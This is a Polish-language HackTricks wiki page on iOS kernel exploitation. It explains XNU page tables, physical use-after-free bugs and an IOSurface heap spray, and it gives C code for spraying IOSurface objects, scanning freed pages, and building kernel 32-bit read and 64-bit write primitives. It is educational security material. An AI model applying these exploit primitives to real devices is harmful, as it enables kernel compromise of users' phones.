# iOS Physical Use-After-Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Physical use-after-free

To jest podsumowanie wpisu z [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html); dodatkowe informacje o exploitach wykorzystujących tę technikę można znaleźć w [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Memory management in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

Przestrzeń adresowa pamięci wirtualnej dla procesów użytkownika na iOS obejmuje zakres od **0x0 do 0x8000000000**. Te adresy nie odpowiadają bezpośrednio pamięci fizycznej. Zamiast tego **kernel** używa **page tables** do tłumaczenia adresów wirtualnych na rzeczywiste **adresy fizyczne**.

#### Levels of Page Tables in iOS

Page tables są zorganizowane hierarchicznie w trzech poziomach:

1. **L1 Page Table (Level 1)**:
* Każdy wpis reprezentuje duży zakres pamięci wirtualnej.
* Pokrywa **0x1000000000 bytes** (czyli **256 GB**) pamięci wirtualnej.
2. **L2 Page Table (Level 2)**:
* Wpis tutaj reprezentuje mniejszy region pamięci wirtualnej, konkretnie **0x2000000 bytes** (32 MB).
* Wpis w L1 może wskazywać na tabelę L2, jeśli nie może samodzielnie zmapować całego regionu.
3. **L3 Page Table (Level 3)**:
* To najdokładniejszy poziom, gdzie każdy wpis mapuje pojedynczą stronę pamięci o rozmiarze **4 KB**.
* Wpis w L2 może wskazywać na tabelę L3, jeśli wymagana jest większa granularność.

#### Mapping Virtual to Physical Memory

* **Direct Mapping (Block Mapping)**:
* Niektóre wpisy w page table bezpośrednio **mapują zakres adresów wirtualnych** na ciągły zakres adresów fizycznych (jak skrót).
* **Pointer to Child Page Table**:
* Jeśli potrzebna jest większa kontrola, wpis na jednym poziomie (np. L1) może wskazywać na **child page table** na następnym poziomie (np. L2).

#### Example: Mapping a Virtual Address

Załóżmy, że próbuje się uzyskać dostęp do adresu wirtualnego **0x1000000000**:

1. **L1 Table**:
* Kernel sprawdza wpis w tabeli L1 odpowiadający temu adresowi wirtualnemu. Jeśli ma **pointer to an L2 page table**, przechodzi do tej L2.
2. **L2 Table**:
* Kernel sprawdza tabelę L2 w poszukiwaniu bardziej szczegółowego mapowania. Jeśli wpis wskazuje na **L3 page table**, idzie dalej.
3. **L3 Table**:
* Kernel odczytuje końcowy wpis L3, który wskazuje na **adres fizyczny** właściwej strony pamięci.

#### Example of Address Mapping

Jeśli zapiszesz adres fizyczny **0x800004000** w pierwszym indeksie tabeli L2, to:

* Adresy wirtualne od **0x1000000000** do **0x1002000000** będą mapowane na adresy fizyczne od **0x800004000** do **0x802004000**.
* To jest **block mapping** na poziomie L2.

Alternatywnie, jeśli wpis L2 wskazuje na tabelę L3:

* Każda strona 4 KB w zakresie wirtualnym **0x1000000000 -> 0x1002000000** byłaby mapowana przez indywidualne wpisy w tabeli L3.

### Physical use-after-free

Physical use-after-free (UAF) występuje, gdy:

1. Proces **alokuje** pamięć jako **readable and writable**.
2. **page tables** są zaktualizowane, aby zmapować tę pamięć na określony adres fizyczny dostępny dla procesu.
3. Proces **dealokuje** (zwalnia) tę pamięć.
4. Jednak z powodu **buga** kernel **zapomina usunąć mapowanie** z page tables, mimo że odpowiednia pamięć fizyczna została oznaczona jako wolna.
5. Kernel może potem **realokować tę „zwolnioną” pamięć fizyczną** do innych celów, np. danych jądra.
6. Ponieważ mapowanie nie zostało usunięte, proces dalej może **czytać i zapisywać** tę pamięć fizyczną.

To oznacza, że proces może uzyskać dostęp do **stron pamięci jądra**, które mogą zawierać wrażliwe dane lub struktury, co potencjalnie pozwala atakującemu **manipulować pamięcią kernela**.

### IOSurface Heap Spray

Skoro atakujący nie może kontrolować, które konkretne strony kernela zostaną przydzielone do zwolnionej pamięci, używa techniki zwanej **heap spray**:

1. Atakujący **tworzy dużą liczbę obiektów IOSurface** w pamięci kernela.
2. Każdy obiekt IOSurface zawiera **magic value** w jednym ze swoich pól, co ułatwia jego identyfikację.
3. Skanują zwolnione strony, aby sprawdzić, czy któryś z tych obiektów IOSurface trafił na zwolnioną stronę.
4. Gdy znajdą obiekt IOSurface na zwolnionej stronie, mogą go użyć do **odczytu i zapisu pamięci kernela**.

Więcej informacji: [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Pamiętaj, że urządzenia iOS 16+ (A12+) wprowadzają hardware mitigations (jak PPL lub SPTM), które znacznie utrudniają techniki physical UAF.
> PPL wymusza ścisłe zabezpieczenia MMU na stronach związanych z code signing, entitlements i wrażliwymi danymi kernela, więc nawet jeśli strona zostanie ponownie użyta, zapisy z userland lub skompromitowanego kodu kernela do stron chronionych przez PPL są blokowane.
> Secure Page Table Monitor (SPTM) rozszerza PPL, umacniając sam proces aktualizacji page tables. Zapewnia, że nawet uprzywilejowany kod kernela nie może cicho przemapować zwolnionych stron ani manipulować mapowaniami bez przejścia przez bezpieczne kontrole.
> KTRR (Kernel Text Read-Only Region) blokuje sekcję kodu kernela jako read-only po uruchomieniu systemu. To zapobiega wszelkim modyfikacjom kodu kernela w czasie działania, zamykając istotny wektor ataku, na którym często opierają się exploity physical UAF.
> Ponadto alokacje `IOSurface` są mniej przewidywalne i trudniej je zamapować do regionów dostępnych dla użytkownika, co sprawia, że trik z „skanowaniem magic value” jest znacznie mniej niezawodny. `IOSurface` jest teraz również chroniony przez entitlements i ograniczenia sandboxu.

### Step-by-Step Heap Spray Process

1. **Spray IOSurface Objects**: Atakujący tworzy wiele obiektów IOSurface z specjalnym identyfikatorem ("magic value").
2. **Scan Freed Pages**: Sprawdzają, czy któryś z obiektów został przydzielony na zwolnionej stronie.
3. **Read/Write Kernel Memory**: Manipulując polami obiektu IOSurface, uzyskują możliwość wykonywania **arbitrary reads and writes** w pamięci kernela. To pozwala im:
* Użyć jednego pola do **odczytu dowolnej 32-bit wartości** w pamięci kernela.
* Użyć innego pola do **zapisu 64-bit wartości**, uzyskując stabilny **kernel read/write primitive**.

Generate IOSurface objects with the magic value IOSURFACE\_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Wyszukaj obiekty **`IOSurface`** w jednej zwolnionej stronie fizycznej:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Uzyskiwanie odczytu/zapisu jądra za pomocą IOSurface

Po przejęciu kontroli nad obiektem IOSurface w pamięci jądra (zmapowanym do zwolnionej strony fizycznej dostępnej z userspace), możemy go użyć do **dowolnych operacji odczytu i zapisu w jądrze**.

**Kluczowe pola w IOSurface**

Obiekt IOSurface ma dwa kluczowe pola:

1. **Use Count Pointer**: Umożliwia **32-bitowy odczyt**.
2. **Indexed Timestamp Pointer**: Umożliwia **64-bitowy zapis**.

Przez nadpisanie tych wskaźników przekierowujemy je na dowolne adresy w pamięci jądra, co udostępnia możliwości odczytu/zapisu.

#### 32-bitowy odczyt jądra

Aby wykonać odczyt:

1. Nadpisz **use count pointer**, aby wskazywał na docelowy adres pomniejszony o offset 0x14 bajtów.
2. Użyj metody `get_use_count`, aby odczytać wartość spod tego adresu.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64-Bit Kernel Write

Aby wykonać zapis:

1. Nadpisz **indexed timestamp pointer** adresem docelowym.
2. Użyj metody `set_indexed_timestamp`, aby zapisać 64-bitową wartość.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Podsumowanie przebiegu exploita

1. **Trigger Physical Use-After-Free**: Strony zwolnione są dostępne do ponownego użycia.
2. **Spray IOSurface Objects**: Przydziel wiele obiektów IOSurface z unikalną "magic value" w pamięci jądra.
3. **Identify Accessible IOSurface**: Zlokalizuj IOSurface na zwolnionej stronie, którą kontrolujesz.
4. **Abuse Use-After-Free**: Zmodyfikuj wskaźniki w obiekcie IOSurface, aby umożliwić dowolne **kernel read/write** poprzez metody IOSurface.

Dzięki tym prymitywom exploit zapewnia kontrolowane **32-bit reads** i **64-bit writes** do pamięci jądra. Kolejne kroki jailbreak mogą wymagać bardziej stabilnych prymitywów odczytu/zapisu, które mogą wymagać obejścia dodatkowych zabezpieczeń (np. PPL na nowszych urządzeniach arm64e).

{{#include ../../banners/hacktricks-training.md}}
